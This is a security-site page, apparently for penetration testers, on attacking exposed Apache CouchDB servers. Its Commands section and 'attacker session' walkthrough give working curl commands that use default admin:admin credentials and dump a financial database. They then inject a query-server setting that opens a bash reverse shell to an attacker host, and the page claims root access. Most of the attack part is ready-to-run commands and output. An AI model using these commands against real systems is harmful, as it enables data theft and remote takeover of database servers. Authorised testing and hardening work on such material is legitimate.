<!-- Title -->
<h1 class="text-2xl font-bold mb-2">CouchDB Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>NoSQL Databases</strong> • Focus: <strong>CouchDB Abuse & Remote Code Execution</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    Apache CouchDB (TCP/5984) is a document-oriented NoSQL database with a RESTful 
    API. Misconfigurations (such as anonymous access, default admin/admin creds, 
    or outdated versions) allow attackers to enumerate, exfiltrate, or modify data. 
    In some cases, CouchDB’s design functions (query servers) can be abused to 
    achieve remote code execution. Once compromised, attackers can steal entire 
    databases, deploy persistence, and pivot into internal environments.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>No Authentication:</strong> Many CouchDB servers expose unauthenticated APIs.</li>
    <li><strong>Default Credentials:</strong> <code>admin:admin</code> often left unchanged.</li>
    <li><strong>RESTful Exposure:</strong> Direct database manipulation via HTTP requests.</li>
    <li><strong>RCE via Query Servers:</strong> Malicious JavaScript/Python functions can execute OS commands.</li>
    <li><strong>Cloud Exposure:</strong> Frequently exposed in DevOps and IoT environments.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify CouchDB on TCP/5984.</li>
    <li><strong>Authentication:</strong> Attempt default or weak credentials, or check for open access.</li>
    <li><strong>Enumeration:</strong> Query <code>_all_dbs</code> and list documents.</li>
    <li><strong>Exfiltration:</strong> Download sensitive JSON documents (users, tokens, configs).</li>
    <li><strong>Exploitation:</strong> Abuse design documents or query servers for RCE.</li>
    <li><strong>Impact:</strong> Full database compromise, potential system-level execution.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan for CouchDB on TCP/5984.</li>
    <li>Check for unauthenticated access (<code>/_all_dbs</code>).</li>
    <li>Try default creds (<code>admin:admin</code>).</li>
    <li>Enumerate databases, users, and design docs.</li>
    <li>Exploit query server for RCE if possible.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -p5984 --script http-title,http-server-header [target]
curl http://[target]:5984/

# ------------------------------
# List Databases
# ------------------------------
curl http://[target]:5984/_all_dbs

# ------------------------------
# Dump Database
# ------------------------------
curl http://[target]:5984/[database]/_all_docs?include_docs=true

# ------------------------------
# Authenticated Access
# ------------------------------
curl -u admin:admin http://[target]:5984/_users

# ------------------------------
# RCE via Query Server Injection (example)
# ------------------------------
curl -X PUT http://admin:admin@[target]:5984/_config/query_servers/cmd \
-d '"/bin/bash -i >& /dev/tcp/[attacker]/4444 0>&1"'

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p5984 192.168.1.210
curl http://192.168.1.210:5984/_all_dbs
curl -u admin:admin http://192.168.1.210:5984/finance/_all_docs?include_docs=true
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p5984 192.168.1.210
PORT     STATE SERVICE
5984/tcp open  couchdb
|_http-title: Welcome
|_Server: CouchDB/2.3.1

[ saide ~ ]$ curl http://192.168.1.210:5984/_all_dbs
["_users","finance","inventory"]

[ saide ~ ]$ curl http://192.168.1.210:5984/finance/_all_docs?include_docs=true
{
  "rows":[
    {"id":"txn001","doc":{"user":"alice","amount":"5000","account":"123456"}},
    {"id":"txn002","doc":{"user":"bob","amount":"9000","account":"654321"}}
  ]
}

[+] Sensitive financial data exfiltrated

[ saide ~ ]$ curl -X PUT http://admin:admin@192.168.1.210:5984/_config/query_servers/cmd \
-d '"/bin/bash -i >& /dev/tcp/192.168.1.220/4444 0>&1"'

[+] Reverse shell received on attacker host
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample CouchDB exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Service Discovery
5984/tcp open  couchdb

# Databases Found
_users, finance, inventory

# Exploitation
Dumped finance DB (transactions)
Injected malicious query server command

# Proof of Exploitation
uid=0(root) via reverse shell
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting CouchDB
      </a>
    </li>
    <li>
      <a href="https://attack.mitre.org/techniques/T1505/003/" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        MITRE ATT&CK – Server Software Component: CouchDB
      </a>
    </li>
    <li>Red Team workflow: Discover → Check auth → Dump DBs → Inject query server → RCE → Pivot inside network.</li>
  </ul>
</section>
